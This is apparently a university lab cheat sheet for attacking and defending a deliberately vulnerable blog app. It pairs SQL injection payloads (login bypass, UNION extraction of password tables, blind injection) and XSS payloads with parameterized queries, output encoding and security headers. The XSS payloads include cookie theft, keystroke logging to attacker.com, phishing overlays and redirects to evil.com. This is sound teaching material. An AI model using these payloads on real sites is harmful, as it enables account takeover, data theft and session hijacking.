# Lab 7 Payloads Cheat Sheet
## Web Application Security - Attack & Defense Reference

**⚠️ FOR EDUCATIONAL USE ONLY - DO NOT USE ON REAL SYSTEMS WITHOUT PERMISSION**

---

## 🎯 Quick Reference Guide

```
┌────────────────────────────────────────────────────────────────┐
│  📚 Table of Contents                                          │
├────────────────────────────────────────────────────────────────┤
│  1. SQL Injection Payloads                                     │
│     • Login Bypass                                             │
│     • UNION-based Extraction                                   │
│     • Database Enumeration                                     │
│                                                                │
│  2. XSS Payloads                                               │
│     • Basic Alert                                              │
│     • Cookie Stealing                                          │
│     • Advanced Payloads                                        │
│                                                                │
│  3. Defense Techniques                                         │
│     • Input Validation                                         │
│     • Output Encoding                                          │
│     • Security Headers                                         │
└────────────────────────────────────────────────────────────────┘
```

---

## 💉 Part 1: SQL Injection Payloads

### 1.1 Login Bypass Techniques

#### Basic Bypass
```sql
-- Payload 1: Classic OR-based bypass
Username: admin' OR '1'='1' --
Password: (anything)

-- Explanation:
-- Original: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...'
-- Result: '1'='1' is always true, -- comments out password check
```

#### Alternative Bypass Methods
```sql
-- Payload 2: OR 1=1
Username: admin' OR 1=1 --
Password: (anything)

-- Payload 3: Empty password bypass
Username: admin'--
Password: (anything)

-- Payload 4: Always true condition
Username: ' OR 'x'='x
Password: ' OR 'x'='x

-- Payload 5: Using /* */ comments
Username: admin'/*
Password: */OR/**/1=1--
```

#### Login as Specific User
```sql
-- Bypass but login as specific user
Username: alice' --
Password: (anything)

-- Result: Logs in as alice without knowing password
```

---

### 1.2 Search Feature UNION-based SQL Injection

#### Step 1: Determine Number of Columns
```sql
-- Test with different numbers
Search: ' ORDER BY 1--
Search: ' ORDER BY 2--
Search: ' ORDER BY 3--
Search: ' ORDER BY 4--
Search: ' ORDER BY 5--
Search: ' ORDER BY 6--  (ERROR = จำนวน column น้อยกว่านี้)

-- หรือใช้ UNION SELECT
Search: ' UNION SELECT NULL--
Search: ' UNION SELECT NULL,NULL--
Search: ' UNION SELECT NULL,NULL,NULL--
... (continue until no error)
```

#### Step 2: Find Displayable Columns
```sql
-- สมมติมี 5 columns
Search: ' UNION SELECT '1','2','3','4','5'--

-- ดูว่าตัวเลขไหนแสดงบนหน้าจอ
-- เช่น ถ้าเห็น '2' และ '3' = column 2,3 แสดงผลได้
```

#### Step 3: Extract Database Schema
```sql
-- SQLite: Get all table names
Search: ' UNION SELECT name,sql,'','','' FROM sqlite_master WHERE type='table'--

-- Result จะแสดง table names และ schema
```

#### Step 4: Extract User Data
```sql
-- Extract usernames and passwords
Search: ' UNION SELECT id,username,password,email,'' FROM users--

-- Extract specific user
Search: ' UNION SELECT id,username,password,email,'' FROM users WHERE username='admin'--
```

#### Step 5: Extract Other Sensitive Data
```sql
-- Count total users
Search: ' UNION SELECT COUNT(*),NULL,NULL,NULL,NULL FROM users--

-- Get posts from specific user
Search: ' UNION SELECT id,title,content,created_at,'' FROM posts WHERE user_id=1--

-- Extract comments
Search: ' UNION SELECT id,content,post_id,user_id,'' FROM comments--
```

---

### 1.3 Advanced SQL Injection Techniques

#### String Concatenation
```sql
-- SQLite concatenation
Search: ' UNION SELECT username||':'||password,email,'','','' FROM users--
-- Result: "admin:admin123"

-- Multiple rows
Search: ' UNION SELECT group_concat(username||':'||password),NULL,NULL,NULL,NULL FROM users--
-- Result: "admin:admin123,alice:alice123,bob:bob123"
```

#### Conditional Responses
```sql
-- Boolean-based blind SQLi
Search: ' AND 1=1--  (TRUE - returns results)
Search: ' AND 1=2--  (FALSE - no results)

-- Extract data character by character
Search: ' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

#### Time-based Blind SQLi (SQLite)
```sql
-- Using randomblob and hex functions to cause delay
Search: ' AND CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master) ELSE 1 END--
```

---

## 🎭 Part 2: XSS Payloads

### 2.1 Basic XSS Testing

#### Simple Alert Box
```html
<!-- Test 1: Basic script tag -->
<script>alert('XSS')</script>

<!-- Test 2: Alert with message -->
<script>alert('XSS Vulnerability Found!')</script>

<!-- Test 3: Alert with number -->
<script>alert(1)</script>

<!-- Test 4: Confirm dialog -->
<script>confirm('Are you vulnerable to XSS?')</script>
```

---

### 2.2 Stored XSS Payloads (for Comments)

#### Cookie Stealing
```html
<!-- Display cookie in alert -->
<script>alert('Your cookie: ' + document.cookie)</script>

<!-- Send cookie to attacker server (example only) -->
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Alternative using image -->
<script>
new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;
</script>
```

#### Phishing Attack
```html
<!-- Create fake login form -->
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; padding:50px;">
    <h2>⚠️ Session Expired</h2>
    <p>Please re-enter your credentials:</p>
    <form>
        <input type="text" id="fake_user" placeholder="Username" /><br><br>
        <input type="password" id="fake_pass" placeholder="Password" /><br><br>
        <button type="button" onclick="alert('Stolen: ' + document.getElementById('fake_user').value + ' / ' + document.getElementById('fake_pass').value)">Login</button>
    </form>
</div>
```

#### Redirect Attack
```html
<!-- Redirect to malicious site -->
<script>
window.location = 'https://evil.com/phishing';
</script>

<!-- Redirect after delay -->
<script>
setTimeout(function() {
    window.location = 'https://evil.com';
}, 3000);
</script>
```

#### Page Defacement
```html
<!-- Change page content -->
<script>
document.body.innerHTML = '<h1 style="color:red; text-align:center; padding:100px;">This site has been hacked!</h1>';
</script>
```

#### Keylogger
```html
<!-- Log all keystrokes -->
<script>
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
});
</script>
```

---

### 2.3 Reflected XSS Payloads (for Search)

#### Basic Tests
```html
<!-- Test 1: Simple script -->
<script>alert('Reflected XSS')</script>

<!-- Test 2: Using img tag -->
<img src=x onerror="alert('XSS')">

<!-- Test 3: Using svg -->
<svg onload="alert('XSS')">

<!-- Test 4: Using body tag -->
<body onload="alert('XSS')">
```

#### Event Handler Payloads
```html
<!-- Mouse events -->
<div onmouseover="alert('XSS')">Hover me</div>
<img src=x onerror="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>

<!-- Click events -->
<button onclick="alert('XSS')">Click me</button>
<a href="javascript:alert('XSS')">Click</a>
```

#### Filter Bypass Techniques
```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Encoded characters -->
<script>alert('XSS')</script>  <!-- HTML entities -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- URL encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Without quotes -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- Using backticks -->
<script>alert(`XSS`)</script>

<!-- Using eval -->
<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>  <!-- Base64: alert('XSS'); -->
```

---

### 2.4 Advanced XSS Payloads

#### DOM-based XSS
```javascript
// If page uses innerHTML with URL parameters
?search=<img src=x onerror="alert('XSS')">

// If page uses document.write
?name=<script>alert('XSS')</script>

// Using hash fragment
#<img src=x onerror="alert('XSS')">
```

#### Persistent XSS with LocalStorage
```html
<script>
// Store malicious code in localStorage
localStorage.setItem('malicious', 'alert("XSS from storage")');

// Execute on page load
eval(localStorage.getItem('malicious'));
</script>
```

---

## 🛡️ Part 3: Defense Techniques

### 3.1 SQL Injection Prevention

#### ✅ Using Parameterized Queries (BEST PRACTICE)

**Vulnerable Code:**
```javascript
// ❌ WRONG: String concatenation
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.get(query, (err, user) => { ... });
```

**Secure Code:**
```javascript
// ✅ CORRECT: Parameterized query
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.get(query, [username, password], (err, user) => { ... });
```

#### ✅ Using ORM (Alternative)
```javascript
// Using Sequelize ORM
const user = await User.findOne({
    where: {
        username: username,
        password: password
    }
});
```

#### ✅ Input Validation (Defense in Depth)
```javascript
// Whitelist allowed characters
function validateUsername(username) {
    const regex = /^[a-zA-Z0-9_]{3,20}$/;
    if (!regex.test(username)) {
        throw new Error('Invalid username');
    }
    return username;
}

// Validate and sanitize
const safeUsername = validateUsername(req.body.username);
```

---

### 3.2 XSS Prevention

#### ✅ Output Encoding (BEST PRACTICE)

**Vulnerable Code:**
```javascript
// ❌ WRONG: Direct innerHTML
commentsList.innerHTML = comments.map(c => `
    <p>${c.content}</p>
`).join('');
```

**Secure Code - Method 1: HTML Escape Function**
```javascript
// ✅ CORRECT: Escape HTML entities
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

commentsList.innerHTML = comments.map(c => `
    <p>${escapeHtml(c.content)}</p>
`).join('');
```

**Secure Code - Method 2: textContent**
```javascript
// ✅ CORRECT: Use textContent instead of innerHTML
comments.forEach(comment => {
    const div = document.createElement('div');
    div.className = 'comment';
    
    const p = document.createElement('p');
    p.textContent = comment.content;  // Safe!
    
    div.appendChild(p);
    commentsList.appendChild(div);
});
```

**Secure Code - Method 3: DOMPurify Library**
```javascript
// ✅ CORRECT: Use sanitization library
import DOMPurify from 'dompurify';

commentsList.innerHTML = comments.map(c => `
    <p>${DOMPurify.sanitize(c.content)}</p>
`).join('');
```

---

### 3.3 Security Headers

#### Content Security Policy (CSP)
```javascript
// Express.js middleware
app.use((req, res, next) => {
    // Basic CSP
    res.setHeader('Content-Security-Policy', 
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
    
    next();
});

// Strict CSP (more secure)
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy',
        "default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'; base-uri 'self';");
    next();
});
```

#### Other Security Headers
```javascript
app.use((req, res, next) => {
    // Prevent XSS
    res.setHeader('X-XSS-Protection', '1; mode=block');
    
    // Prevent MIME sniffing
    res.setHeader('X-Content-Type-Options', 'nosniff');
    
    // Prevent clickjacking
    res.setHeader('X-Frame-Options', 'DENY');
    
    // HTTPS only
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    
    next();
});
```

---

### 3.4 Input Validation Patterns

#### Username Validation
```javascript
function validateUsername(username) {
    // Only alphanumeric and underscore, 3-20 chars
    const regex = /^[a-zA-Z0-9_]{3,20}$/;
    return regex.test(username);
}
```

#### Email Validation
```javascript
function validateEmail(email) {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
}
```

#### Whitelist vs Blacklist
```javascript
// ❌ WRONG: Blacklist approach (can be bypassed)
function sanitizeInput(input) {
    return input.replace(/<script>/gi, '')
                .replace(/javascript:/gi, '')
                .replace(/onerror=/gi, '');
}

// ✅ CORRECT: Whitelist approach
function sanitizeInput(input) {
    // Only allow specific safe characters
    return input.replace(/[^a-zA-Z0-9\s\-_.,]/g, '');
}
```

---

## 🧪 Testing Checklist

### SQL Injection Testing

- [ ] Login form with `' OR '1'='1'--`
- [ ] Login form with `admin'--`
- [ ] Search with `' UNION SELECT`
- [ ] Search with `' ORDER BY`
- [ ] Try extracting users table
- [ ] Try extracting other tables
- [ ] Test with encoded payloads
- [ ] Test with different SQL comments (`--`, `#`, `/* */`)

### XSS Testing

- [ ] Comment with `<script>alert(1)</script>`
- [ ] Comment with `<img src=x onerror="alert(1)">`
- [ ] Search with XSS payload
- [ ] Try cookie stealing
- [ ] Try page defacement
- [ ] Test with encoded payloads
- [ ] Test with different event handlers
- [ ] Test with uppercase/lowercase variations

---

## 📊 Payload Success Rate Matrix

| Payload Type | VulnBlog | Real World | Difficulty |
|--------------|----------|------------|------------|
| Basic SQLi (`' OR 1=1--`) | ✅ 100% | 🟡 30% | Easy |
| UNION-based SQLi | ✅ 100% | 🟡 50% | Medium |
| Blind SQLi | ⚠️ N/A | 🟡 40% | Hard |
| Basic XSS (`<script>`) | ✅ 100% | 🟡 20% | Easy |
| Event-based XSS (`onerror`) | ✅ 100% | 🟡 40% | Easy |
| DOM-based XSS | ⚠️ N/A | 🟡 30% | Medium |
| Filter Bypass XSS | ✅ 50% | 🔴 10% | Hard |

---

## 🎯 Quick Command Reference

### Testing Tools

```bash
# Using curl for SQL Injection
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\'' --","password":"x"}'

# Using curl for XSS
curl "http://localhost:3000/api/posts/search?q=<script>alert(1)</script>"

# SQLmap (automated SQL injection tool)
sqlmap -u "http://localhost:3000/api/posts/search?q=test" --dbs

# Browser console tests
document.cookie  // View cookies
document.domain  // View domain
localStorage     // View local storage
```

---

## 💡 Pro Tips

### For Attacking (Educational):

1. **Start Simple**: ลอง basic payload ก่อนเสมอ
2. **Read Error Messages**: Error message บอก hints เยอะมาก
3. **Use Browser DevTools**: Network tab และ Console สำคัญมาก
4. **Encode When Needed**: URL encode หรือ HTML encode ถ้า payload ไม่ work
5. **Try Variations**: ถ้า payload ไม่ work ลอง uppercase, spaces, quotes อื่น

### For Defending:

1. **Never Trust User Input**: ทุกอย่างที่มาจาก user คือภัยคุกคาม
2. **Parameterized Queries Always**: ไม่มีข้อแม้
3. **Encode Output**: ก่อนแสดงผลทุกครั้ง
4. **Validate Input**: แต่อย่าพึ่ง validation อย่างเดียว
5. **Defense in Depth**: ใช้หลายชั้นร่วมกัน
6. **Keep Updated**: อัปเดต libraries และ frameworks เสมอ

---

## 🚨 Legal Warning

```
╔════════════════════════════════════════════════════════════╗
║                    ⚠️ IMPORTANT NOTICE                     ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║  การใช้ payloads เหล่านี้กับระบบจริงโดยไม่ได้รับอนุญาต      ║
║  ถือเป็นการกระทำผิดกฎหมาย                                  ║
║                                                            ║
║  ⚖️ พระราชบัญญัติว่าด้วยการกระทำความผิดเกี่ยวกับ          ║
║     คอมพิวเตอร์ พ.ศ. 2560                                   ║
║                                                            ║
║  • มาตรา 5: เข้าถึงระบบคอมพิวเตอร์โดยมิชอบ                 ║
║  • มาตรา 7: เข้าถึงข้อมูลคอมพิวเตอร์โดยมิชอบ                ║
║  • มาตรา 9: ทำให้ข้อมูลเสียหาย เปลี่ยนแปลง สูญหาย         ║
║                                                            ║
║  💰 โทษ: จำคุกไม่เกิน 2 ปี หรือปรับไม่เกิน 40,000 บาท     ║
║         หรือทั้งจำทั้งปรับ                                  ║
║                                                            ║
║  ✅ ใช้เฉพาะใน:                                             ║
║     • Lab environment ของมหาวิทยาลัย                      ║
║     • ระบบที่ตนเองเป็นเจ้าของ                             ║
║     • Bug bounty programs ที่มีข้อตกลงชัดเจน               ║
║     • Penetration testing ที่ได้รับอนุญาตเป็นลายลักษณ์อักษร║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
```

---

## 📚 Additional Resources

### Learn More:
- OWASP Top 10: https://owasp.org/Top10/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTheBox: https://www.hackthebox.com/
- TryHackMe: https://tryhackme.com/

### Tools:
- Burp Suite: https://portswigger.net/burp
- OWASP ZAP: https://www.zaproxy.org/
- SQLmap: https://sqlmap.org/
- XSSer: https://github.com/epsylon/xsser

---

**Good luck with Lab 7! 🎯**

**Remember: With great power comes great responsibility. Use these techniques ethically and legally!**
